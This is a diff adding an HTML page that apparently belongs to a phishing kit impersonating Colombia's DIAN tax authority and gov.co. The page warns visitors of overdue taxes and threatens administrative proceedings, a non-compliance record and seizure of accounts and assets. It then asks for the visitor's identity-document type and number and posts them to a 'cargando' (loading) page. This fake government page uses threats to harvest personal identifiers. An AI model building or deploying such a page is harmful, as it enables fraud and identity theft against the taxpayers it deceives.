@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de impuestos - DIAN</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu&family=Work+Sans&display=swap" rel="stylesheet">
+    <style>
+    * {
+        font-family: Ubuntu, Work-Sans, sans-serif;
+    }
+    </style>
+</head>
+<body>
+    <div style="background-color: #3366CC; overflow: hidden;">
+    <img src="/imagenes/logo_footer.png" alt="Logo GOV" width="20%" style="margin-top: -5px; margin-left: 5px;">
+    </div>
+    <div style="background-color: #E6EEFD; width: 77%; margin-left: auto; margin-right: 0;">
+        <p style="font-size: 11px; margin-top: -24px; text-align: center; padding: 4px; color: #676767;">El estado no tiene por qué ser aburrido ¡conoce a gov.co!</p>
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+    <img src="/imagenes/logo-dian.png" alt="Logo DIAN" width="30%" style="margin-right: 50px;">
+    <img src="/imagenes/hacienda.png" alt="Logo Hacienda" width="35%" style="margin-left: 50px;">
+    </div>
+    <div style="text-align: center; margin-top: 20px;">
+    <img src="/imagenes/Sistema_Facturacion_Logo.png" alt="Logo Facturación" width="65%">
+    </div>
+    <div style="position: absolute; top: 200px; left: 50%; transform: translateX(-50%); width: calc(100% - 35px); max-width: calc(100% - 35px); height: 6px; background-color: #00B4DC; z-index: 9999;"></div>
+    
+    <div style="width: calc(100% - 35px); max-width: calc(100% - 35px); padding: 20px; border-radius: 25px; background-color: #F6F7F9; margin: 0 auto; text-align: center; margin-top: 65px; color: #1A1A1A;">
+    <h1 style="font-size: 22px; margin-bottom: 20px; font-weight: bold;">Consulta de impuestos</h1>
+    <p style="text-align: left; font-size: 14px; margin-bottom: 20px;">
+        Ingrese su documento de identidad para ver el estado de sus Tributos, luego presione el botón <span style="color: #00B4DC; font-weight: bold;">Consultar</span>. Deberá realizar el pago de los <span style="font-weight: bold;">impuestos en mora</span>, para evitar:
+        <ul style="text-align: left; padding-left: 20px; font-size: 14px;">
+            <li style="color: #00B4DC;"><span style="color: #1A1A1A;">Inicio de proceso administrativo.</span></li>
+            <li style="color: #00B4DC;"><span style="color: #1A1A1A;">Registro de antecedentes por incumplimiento tributario.</span></li>
+            <li style="color: #00B4DC;"><span style="color: #1A1A1A;">Embargo de cuentas y bienes por concepto tributario.</span></li>
+        </ul>
+    </p>
+    <br/>
+    <h3 style="color: #676767; font-size: 15px;">Diligencia tus datos de identificación</h3>
+    </br>
+    <form method="POST" action="/cargando.html" style="display: flex; flex-direction: column; align-items: center; color: #1A1A1A;">
+        <label for="tipo_documento" style="color: #676767; font-size: 15px; width: 100%; margin-bottom: 10px;">Tipo de documento</label>
+        <select id="tipo_documento" name="tipo_documento" style="color: #676767; font-size: 14px; width: 90%; height: 40px; margin-bottom: 10px;" required>
+            <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
+            <option value="Tarjeta de identidad">Tarjeta de identidad</option>
+            <option value="Cédula de extranjería">Cédula de extranjería</option>
+            <option value="Pasaporte">Pasaporte</option>
+            <option value="Tarjeta de extranjería">Tarjeta de extranjería</option>
+        </select>
+        </br>
+        <label for="numero_documento" style="color: #676767; font-size: 15px; width: 100%; margin-bottom: 10px;">Número de documento <span><img style="margin-left: 5px;" src="/imagenes/help.png" alt="Ayuda"></span></label>
+        <input type="tel" id="numero_documento" name="numero_documento" placeholder="Escribe aquí tu número de documento" style="color: #676767; font-size: 14px; width: 90%; height: 40px; margin-bottom: 20px;" required maxlength="10" minlength="6" pattern="[0-9]*">
+        </br>
+        <button type="submit" style="width: 60%; padding: 10px; background-color: #00000033; color: white; border: none; border-radius: 5px; font-weight: bold;">Consultar</button>
+        </br>
+    </form>
+</div>
+
+<script>
+    document.getElementById('numero_documento').addEventListener('input', function() {
+        var numeroDocumento = this.value;
+        var botonConsultar = this.form.querySelector('button[type="submit"]');
+
+        if (numeroDocumento.length >= 6) {
+            botonConsultar.style.backgroundColor = '#00B4DC';
+            botonConsultar.style.color = 'white';
+            botonConsultar.style.fontWeight = 'bold';
+        } else {
+            botonConsultar.style.backgroundColor = '#00000033';
+            botonConsultar.style.color = 'white';
+            botonConsultar.style.fontWeight = 'normal';
+        }
+    });
+</script>
+    
+    <div style="margin-top: 20px;">
+        <img src="/imagenes/footer.png" alt="Footer" width="100%">
+    </div>
+</body>
+</html>
